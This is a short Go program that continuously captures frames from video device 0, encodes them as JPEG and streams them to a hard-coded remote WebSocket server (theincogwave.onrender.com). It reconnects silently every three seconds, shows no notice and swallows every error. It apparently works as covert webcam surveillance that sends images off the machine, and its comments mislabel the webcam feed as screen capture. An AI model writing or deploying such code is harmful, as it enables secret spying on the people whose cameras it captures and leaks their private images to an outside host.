package main

import (
	"bytes"
	"image/jpeg"
	"time"

	"github.com/gorilla/websocket"
	"gocv.io/x/gocv"
)

func connectAndStream() {
	for {
		// Attempt to connect to the WebSocket server
		conn, _, err := websocket.DefaultDialer.Dial("ws://theincogwave.onrender.com/ws", nil)
		if err != nil {
			time.Sleep(3 * time.Second) // Wait 3 seconds before trying to reconnect
			continue
		}
		defer conn.Close()

		// Initialize screen capture
		webcam, err := gocv.OpenVideoCapture(0) // Use screen capture device if necessary
		if err != nil {
			return
		}
		defer webcam.Close()

		img := gocv.NewMat()
		defer img.Close()

		// Stream the screen to the server
		for {
			if ok := webcam.Read(&img); !ok {
				break // Exit loop if there’s an issue capturing the screen
			}

			// Convert Mat to image.Image
			image, err := img.ToImage()
			if err != nil {
				continue // Handle the error and continue
			}

			buf := new(bytes.Buffer)
			err = jpeg.Encode(buf, image, nil) // Use the converted image
			if err != nil {
				continue
			}

			// Send image frame to WebSocket
			if err := conn.WriteMessage(websocket.BinaryMessage, buf.Bytes()); err != nil {
				break // Exit inner loop to attempt reconnection
			}

			time.Sleep(100 * time.Millisecond) // Adjust frame rate as needed
		}
	}
}

func main() {
	// Start streaming and automatically reconnect on failure
	connectAndStream()
}
